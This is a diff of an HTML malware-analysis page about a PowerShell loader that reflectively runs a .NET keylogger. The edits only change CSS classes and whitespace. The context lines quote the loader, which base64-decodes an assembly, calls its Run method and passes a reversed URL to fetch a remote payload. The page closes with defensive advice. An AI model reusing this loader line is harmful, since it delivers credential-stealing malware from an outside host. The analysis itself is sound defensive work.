@@ -127,7 +127,7 @@
 
                             <img src="img/PS .NET Assembly Usage/hexdump.png" class="img-fluid" width="700">
 
-                            <div style="background-color: yellow">
+                            <div class="longword" style="background-color: yellow">
                                 [Byte[]] $Rumpe = [System.Convert]::FromBase64String( $RumpeD[-1..-$RumpeD.Length] -join '' );
                                 [Reflection.Assembly]::Load($Rumpe).GetType('ent.Class1').GetMethod('Run').Invoke($null, [object[]] ('txt.33615435222/sbv/erots.sbvle//:ptth'))"
                             </div><br>
@@ -203,7 +203,7 @@
                             <br>
                             Registry key can also sound like persistence. The program is calling the method "CreateSubKey" on the HKEY_CURRENT_USER\Software and use the attribute "registryName" as argument, so "registryName" doesn't seem to be encrypted. The registry hive HKCU contains information for Windows and softwares for a specific user. The default path for persistance is "<strong>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</strong>". In this case, it creates a subkey of HKCU\Software, this subkey gives the default location of an executable, and is not a sign of persistence.
 
-                            <img src="img/PS .NET Assembly Usage/registry.png" width="700">
+                            <img src="img/PS .NET Assembly Usage/registry.png" class="img-fluid" width="700">
 
                         </p>
                     </div>
@@ -216,7 +216,7 @@
                         FireEye has detected a suspicious bahavior, but doesn't really know what was exactly the program installed by the user. After, reversing the program, we've found it will proceed to a connection to a domain on a specific port. It also records all the user's inputs and send it to the domain. Therefore, it is a trojan keylogger which register every keyboard input and send it to the domain. 
 
                         After that analysis, we know the intention of the attacker, retrieving the users' credentials and get an access to the company network. <br>
-                        Blocking the domain name, file hash is a good start for future protection. A rebuild of the system, and expiring the user's password is necessary.
+                        Blocking the domain name, file hash is a good start for future protection. A rebuild of the system, and expiring the user's password is necessary. 
                     </div>
                 </div>
             </section>
